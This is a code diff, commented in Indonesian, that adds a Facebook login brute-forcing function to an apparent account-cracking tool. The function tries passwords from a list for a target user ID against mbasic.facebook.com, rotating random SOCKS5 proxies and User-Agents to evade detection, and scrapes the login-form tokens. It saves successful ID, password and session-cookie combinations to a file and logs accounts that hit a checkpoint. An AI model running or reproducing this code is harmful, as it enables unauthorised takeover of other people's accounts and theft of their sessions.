@@ -1576,9 +1576,122 @@ def metcepat():
     print("")
 
 
+
+def validate_login(idf, pwv):
+    global loop, ok, cp
+
+    rc = random.choice
+    rr = random.randint
+
+    # Validasi jika proxy kosong
+    if not prox:
+        print("Proxy list kosong. Harap tambahkan proxy terlebih dahulu.")
+        return
+
+    # Proses iterasi untuk validasi
+    for pw in pwv:
+        try:
+            nip = rc(prox)  # Pilih proxy acak
+            proxs = {'http': 'socks5://' + nip}
+            ua = rc(ugen2)  # Pilih User-Agent acak
+
+            # Update progress
+            prog.update(
+                des,
+                description=f" {K2}•{H2} VALIDATE V2 UPDATE {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]"
+            )
+            prog.advance(des)
+
+            # Update headers untuk sesi
+            ses = requests.Session()
+            ses.headers.update({
+                'Host': 'mbasic.facebook.com',
+                'cache-control': 'max-age=0',
+                'sec-ch-ua-mobile': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': ua,
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-dest': 'empty',
+                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
+            })
+
+            # Permintaan awal untuk mendapatkan form login
+            response = ses.get(
+                'https://mbasic.facebook.com/login.php',
+                proxies=proxs
+            )
+            response.raise_for_status()
+
+            # Ambil nilai 'lsd' dan 'jazoest' menggunakan Regex
+            lsd = re.search('name="lsd" value="(.*?)"', response.text)
+            jazoest = re.search('name="jazoest" value="(.*?)"', response.text)
+
+            if not lsd or not jazoest:
+                print("Gagal mengambil data form login. Coba lagi.")
+                continue
+
+            # Data untuk POST request
+            dataa = {
+                "lsd": lsd.group(1),
+                "jazoest": jazoest.group(1),
+                "uid": idf,
+                "next": "https://developers.facebook.com/tools/debug/accesstoken/",
+                "flow": "login_no_pin",
+                "pass": pw,
+            }
+
+            # Permintaan POST untuk login
+            po = ses.post(
+                'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',
+                data=dataa,
+                allow_redirects=False,
+                proxies=proxs
+            )
+
+            # Ambil cookies dari sesi
+            cookies = ses.cookies.get_dict()
+
+            # Cek hasil login
+            if "c_user" in cookies:
+                ok += 1
+                save_result('OK', idf, pw, ua, cookies)
+                break
+            elif "checkpoint" in cookies:
+                cp += 1
+                save_result('CP', idf, pw, ua)
+                break
+            else:
+                continue
+
+        except requests.exceptions.ConnectionError:
+            print("Koneksi gagal. Menunggu 31 detik...")
+            time.sleep(31)
+        except AttributeError as e:
+            print(f"Regex error: {e}")
+        except Exception as e:
+            print(f"Kesalahan tidak terduga: {e}")
+        finally:
+            loop += 1
+
+
+# Fungsi untuk menyimpan hasil login
+def save_result(status, idf, pw, ua, cookies=None):
+    if status == 'OK':
+        print(f"SUCCESS: {idf} | {pw}")
+        kuki = ";".join([f"{key}={value}" for key, value in cookies.items()])
+        with open(f'OK/success.txt', 'a') as file:
+            file.write(f"{idf}|{pw}|{ua}|{kuki}\n")
+    elif status == 'CP':
+        print(f"CHECKPOINT: {idf} | {pw}")
+        with open(f'CP/checkpoint.txt', 'a') as file:
+            file.write(f"{idf}|{pw}\n")
+
+
 from typing import List, Dict
 # Fungsi untuk memvalidasi login
-def validate_login(idf: str, pwv: List[str], ugen2: List[str], prox: List[str]) -> None:
+def validate_logingggg(idf: str, pwv: List[str], ugen2: List[str], prox: List[str]) -> None:
     global loop, ok, cp
     session = requests.Session()
 
